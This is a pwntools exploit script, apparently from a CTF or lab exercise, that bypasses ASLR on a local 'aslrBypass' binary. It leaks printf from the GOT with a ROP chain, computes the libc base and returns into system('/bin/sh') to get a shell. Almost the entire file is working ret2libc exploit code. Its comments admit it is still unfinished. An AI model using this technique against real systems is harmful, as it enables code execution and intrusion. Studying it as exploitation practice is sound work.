from pwn import *

elf = ELF("./aslrBypass")
context.terminal = ["tmux", "splitw", "-h"]

if args.ATTACH:
    p = process(elf.path)
    g = gdb.attach(p, gdbscript='''
    b main
    ''')

if args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
    b main
    ''')

else:
    p = process(elf.path)



#Leave ret does the following:
#mov rsp, rbp   ; leave part
#pop rbp        ; leave part
#pop rip        ; ret part





#We need to get 4 addresses to make the leak
#pop rdi ret gadget
#Address of printf entry in GOT
#Address of puts entry in PLT
#Address of main function

#Using the command: objdump -D aslBypass | grep printf
#We are able to get the address of printf GOT entry: 0x404008
got_printf = 0x404008

#Address of puts plt entry
#Can be read using command: rabin2 -i aslrBypass
plt_puts = 0x401030
got_puts = 0x401154
#We find the rop gadget using command: ROPgagdeget --binary aslrBypass | grep "pop rdi"
pop_rdi_ret = 0x00401159
ret = 0x0040101a
read_addr = 0x004011be

pop_rdx_pop_rsi_pop_rdi_ret = 0x00401171
#Main address can be found using r2 or gdb
#To find main in gdb, open the program in gdb and type: b main
main_addr = 0x0040117c

#.data section minux some stuff
rbp_original = 0x7fffffffe480
#0x7fffffffe480 #gdb crashes no matter what we set rbp to

libc_printf = 0x0051090
libc_system = 0x004a820
libc_exit = 0x003c190
libc_bin_sh = 0x00199def

offset = b"A"*32

#Payload 1
payload = offset
payload += p64(rbp_original)
payload += p64(pop_rdi_ret)
payload += p64(got_printf)
payload += p64(got_puts)
payload += b"B"*8 #pop rbp random call
payload += p64(0x401227) #ret on second_input()


#Interaction 1
p.recvuntil(b"data:")
p.send(payload)
p.recv()
leaked_printf = p.recv()[:8].strip().ljust(8, b"\00")
leaked_printf = u64(leaked_printf)
log.success("Leaked printf@GLIBC: " + hex(leaked_printf))

libc_main = leaked_printf - libc_printf
log.success("libc_main:" + hex(libc_main))
system = p64(libc_main + libc_system)
bin_sh = p64(libc_main + libc_bin_sh)
exit_addr = p64(libc_main + libc_exit)

#Payload 2
buff = offset
buff += p64(rbp_original)
buff += p64(pop_rdi_ret)
buff += bin_sh #pop rdi
buff += p64(ret) # ret for alignment
buff += system # ret
######
#####
#Right now we are not crashing on the leave instruction during the second rundown of main
#But we need to point the rsp to right above bin/sh so we can do the leave ret and return to gadgets..



#Interaction 2
p.clean(0.2)
p.send(buff)

p.interactive()
